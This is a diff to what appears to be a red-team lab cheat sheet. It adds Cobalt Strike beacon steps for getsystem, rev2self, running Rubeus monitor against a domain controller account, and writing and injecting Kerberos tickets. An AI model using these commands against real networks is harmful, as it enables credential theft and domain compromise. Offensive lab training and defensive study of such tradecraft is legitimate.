@@ -557,6 +557,11 @@ beacon> getuid
 // If returns domain user (not SYSTEM) and SYSTEM is required (e.g. krb_dump machine TGT):
 beacon> getsystem    // OPSEC-🟠CAUTION — named pipe impersonation, works from admin context
 // steal_token <SYSTEM-pid> fails from winrm64 wsmprovhost.exe context — use getsystem instead
+
+// ⚠️ Lab-confirmed (2026-04-19): getsystem token breaks execute-assembly — "No .NET runtime found"
+// If you need to run execute-assembly (e.g. Rubeus monitor) after getsystem:
+beacon> rev2self     // drop getsystem token — rsteel admin context is sufficient for execute-assembly
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
 ```
 
 ---
@@ -858,6 +863,9 @@ INJECT TGT:
   make_token DOMAIN\user FakePass  →  kerberos_ticket_use <path>.kirbi  →  rev2self  // fallback (🟠CAUTION Event 4648)
   ⚠️ make_token optional when beacon is SYSTEM — kerberos_ticket_use injects into SYSTEM session directly
   ⚠️ krb_dump luid: use /luid:3e7 NOT /luid:0x3e7 — Kerbeus-BOF rejects 0x prefix ("Invalid luid")
+  ⚠️ kerberos_ticket_use requires FILE PATH — pasting raw base64 fails ("does not exist"). Write .kirbi first:
+     [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\ticket.kirbi", [Convert]::FromBase64String("[B64]"))
+  ⚠️ getsystem + execute-assembly = "No .NET runtime found" — rev2self before running execute-assembly
 
 CLEANUP:
   rev2self | rm <kirbi-files> | sql-disableclr | sql-disablerpc
